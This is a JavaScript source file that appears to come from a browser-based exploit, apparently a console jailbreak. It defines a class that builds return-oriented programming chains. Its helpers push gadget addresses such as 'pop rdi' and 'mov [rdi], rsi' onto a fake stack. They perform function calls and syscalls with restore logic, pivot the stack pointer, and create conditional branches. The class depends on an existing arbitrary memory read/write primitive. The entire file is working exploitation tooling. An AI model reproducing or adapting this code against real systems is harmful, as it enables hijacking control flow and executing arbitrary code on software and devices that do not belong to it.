const stack_sz = 0x40000;
const reserve_upper_stack = 0x8000;
const stack_reserved_idx = reserve_upper_stack / 4;


// Class for quickly creating and managing a ROP chain
window.rop = function () {
  this.stackback = p.malloc32(stack_sz / 4);
  this.stack = this.stackback.add32(reserve_upper_stack);
  this.stack_array = this.stackback.backing;
  this.retval = this.stack.add32(0x3FFF8);
  this.count = 1;
  this.branches_count = 0;
  this.branches_rsps = p.malloc(0x200);
  this.useless_buffer = p.malloc(8);

  this.clear = function () {
    this.count = 1;
    this.branches_count = 0;

    for (var i = 1; i < ((stack_sz / 4) - stack_reserved_idx); i++) {
      this.stack_array[i + stack_reserved_idx] = 0;
    }
  };

  this.pushSymbolic = function () {
    this.count++;
    return this.count - 1;
  }

  this.finalizeSymbolic = function (idx, val) {
    if (val instanceof int64) {
      this.stack_array[stack_reserved_idx + idx * 2] = val.low;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
    } else {
      this.stack_array[stack_reserved_idx + idx * 2] = val;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
    }
  }

  this.push = function (val) {
    this.finalizeSymbolic(this.pushSymbolic(), val);
  }

  this.push_write8 = function (where, what) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["pop rsi"]);
    this.push(what);
    this.push(gadgets["mov [rdi], rsi"]);
  }

  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]);
      this.push(rdi);
    }

    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]);
      this.push(rsi);
    }

    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]);
      this.push(rdx);
    }

    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]);
      this.push(rcx);
    }

    if (r8 != undefined) {
      this.push(gadgets["pop r8"]);
      this.push(r8);
    }

    if (r9 != undefined) {
      this.push(gadgets["pop r9"]);
      this.push(r9);
    }

    this.push(rip);
    return this;
  }

  //get rsp of the next push
  this.get_rsp = function () {
    return this.stack.add32(this.count * 8);
  }
  this.write_result = function (where) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["mov [rdi], rax"]);
  }

  //when looping over the same chain you have to keep in mind some code pushes shit on the stack (overwriting the chain), you could either have your stack be somewhere in the middle of a buffer(so that it can go up and down) and at the end of your chain have it write itself again
  //syscalls however don't push much so you can restore them just fine without a lot of shit
  this.syscall_fix = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]);
      this.push(rdi);
    }

    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]);
      this.push(rsi);
    }

    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]);
      this.push(rdx);
    }

    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]);
      this.push(rcx);
    }

    if (r8 != undefined) {
      this.push(gadgets["pop r8"]);
      this.push(r8);
    }

    if (r9 != undefined) {
      this.push(gadgets["pop r9"]);
      this.push(r9);
    }
    var sysc_restore = this.get_rsp();
    this.push(window.syscalls[sysc]);
    this.push(window.gadgets["pop rdi"]);
    this.push(sysc_restore);
    this.push(window.gadgets["pop rsi"]);
    this.push(window.syscalls[sysc]);
    this.push(window.gadgets["mov [rdi], rsi"]);
  }
  this.jmp_rsp = function (rsp) {
    this.push(window.gadgets["pop rsp"]);
    this.push(rsp);
  }

  this.create_equal_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setne al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;

  }
  this.create_greater_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setle al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }
  this.create_greater_or_equal_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setl al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }
  this.create_lesser_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setge al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }
  this.create_lesser_or_equal_branch = function (value_addr, compare_value) {
    var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
    this.branches_count++;

    this.push(window.gadgets["pop rax"]);
    this.push(0);
    this.push(window.gadgets["pop rcx"]);
    this.push(value_addr);
    this.push(window.gadgets["pop rdi"]);
    this.push(compare_value);
    this.push(window.gadgets["cmp [rcx], edi"]);
    this.push(window.gadgets["setg al"]);
    this.push(window.gadgets["shl rax, 3"]);
    this.push(window.gadgets["pop rdx"]);
    this.push(branch_addr_spc);
    this.push(window.gadgets["add rax, rdx"]);
    this.push(window.gadgets["mov rax, [rax]"]);
    this.push(window.gadgets["pop rdi"]);
    var a  = this.pushSymbolic();
    this.push(window.gadgets["mov [rdi], rax"]);
    this.push(window.gadgets["pop rsp"]);
    var b = this.get_rsp();
    this.push(0x41414141);

    this.finalizeSymbolic(a, b);

    return branch_addr_spc;
  }

  this.set_branch_points = function (branch_addr_sp, rsp_condition_met, rsp_condition_not_met) {
    p.write8(branch_addr_sp.add32(0x0), rsp_condition_met);
    p.write8(branch_addr_sp.add32(0x8), rsp_condition_not_met);
  }

  this.run = function () {
    var retv = p.loadchain(this);
    this.clear();
    return retv;
  }

  return this;
};